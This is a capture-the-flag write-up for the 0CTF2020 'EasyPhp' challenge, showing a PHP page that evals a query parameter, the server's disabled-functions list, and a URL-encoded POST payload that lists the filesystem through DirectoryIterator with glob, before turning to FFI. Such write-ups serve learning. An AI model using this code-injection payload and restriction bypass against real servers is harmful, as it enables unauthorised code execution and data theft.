Recently, I got opportunity to participate in **0CTF2020 Quals**. It was really a good CTF focused on Intermediate to Advanced participants. I was only able to solve only one PHP challenge during CTF named `EasyPhp`.

## Recon >
First things first, Always Recon the chall. So, on visiting the Provided URL [http://pwnable.org:19260/](http://pwnable.org:19260/) for the chall, We get this piece of php code

```php
<?php
    if (isset($_GET['rh'])) {
        eval($_GET['rh']);
    } else {
        show_source(__FILE__);
    }
    ?>
```

Now, On looking at the source code, It immediately clicked that there is some sort of Code Injection using parameter `rh`. On trying commands like ``` system, exec, popen```, We didn't get anything executed.So, we must have to get our hands on the internals.

Now, we check the settings of back-end php application, For that we have to take a look at `phpinfo();`. On Using phpinfo(); as param in var rh,
[http://pwnable.org:19260/rh=phpinfo();](https://pwnk1dd13.github.io/assets/php.html)

We get to know that dangerous functions that we tried to use before were disabled, Have a look at `disabled_functions` 
```
set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,d
```
Hmm! So, We need to find some other ways. Doing a bit of research and reading writeups , we get know a lot about php exploits. Let's discuss various strategies we thought to exploit it.

## Strategy >

Figure out things, we can exploit : 

* PHP-FPM
* Bypass open_basedir()
* FFI
* glob + DirectoryIterator  : ~~This is not the exploit~~

Now, I'll explain a bit of above and intended solutions that came during CTF in the later section `Conclusion`, Let's first discuss how I solved this challenge.

## Exploit >

We first glob + DirectoryIerator to literally scan the whole server, After doing this, we found interesting things in `/` Directory with this `POST`request:
```
POST /?rh=%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%67%6d%6c%5d%29%3b HTTP/1.1

gml=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');};
```

```
bin dev etc flag.h flag.so home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var
```
Cool, So ,we find our targets `flag.h` and `flag,so`. Now, to exploit further I used evil ``FFI`` which was enabled on server as per phpinfo().
